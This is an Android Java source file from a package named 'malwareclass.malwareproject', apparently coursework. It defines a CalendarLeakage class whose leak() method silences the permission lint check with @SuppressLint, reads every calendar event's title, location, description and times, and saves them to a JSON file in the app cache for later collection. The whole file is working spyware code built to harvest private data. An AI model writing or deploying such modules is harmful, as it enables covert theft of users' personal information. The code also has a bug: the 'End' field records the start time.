package com.malwareclass.malwareproject;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CalendarContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.TimeZone;

public class CalendarLeakage {

    private String TAG = "CalendarLeakage";


    @SuppressLint("MissingPermission")
    public File[] leak(Context context) {

        Log.d(TAG,"Started") ;
        ContentResolver cr = context.getContentResolver();
        Uri uri = CalendarContract.Events.CONTENT_URI;
        Cursor cur = null;
        cur = cr.query(uri, null, null, null, null);
        JSONArray arr = new JSONArray();
        while (cur.moveToNext()) {
            try {
                JSONObject event = new JSONObject();
                event.put("Title", cur.getString(cur.getColumnIndex(CalendarContract.Events.TITLE)));
                event.put("Location", cur.getString(cur.getColumnIndex(CalendarContract.Events.EVENT_LOCATION)));
                event.put("Description", cur.getString(cur.getColumnIndex(CalendarContract.Events.DESCRIPTION)));
                event.put("TimeZone", cur.getString(cur.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE)));

                Long start = cur.getLong(cur.getColumnIndex(CalendarContract.Events.DTSTART));
                SimpleDateFormat df = new SimpleDateFormat("dd/MM/yyyy hh:mm");
                df.setTimeZone(TimeZone.getTimeZone(cur.getString(cur.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE))));
                event.put("Start", df.format(start));

                Long end = cur.getLong(cur.getColumnIndex(CalendarContract.Events.DTEND));
                df.setTimeZone(TimeZone.getTimeZone(cur.getString(cur.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE))));
                event.put("End", df.format(start));

                arr.put(event);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        cur.close();


        Writer output = null;
        String pathname = "calendar_" + new SimpleDateFormat("yyyy.MM.dd-HH.mm.ss").format(new Date()) + ".json";
        File file = new File(context.getCacheDir(),pathname);
        try {
            output = new BufferedWriter(new FileWriter(file));
            output.write(arr.toString());
            output.close();
            File[] files = new File[1];
            files[0] = file;

            return files;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;

    }
}
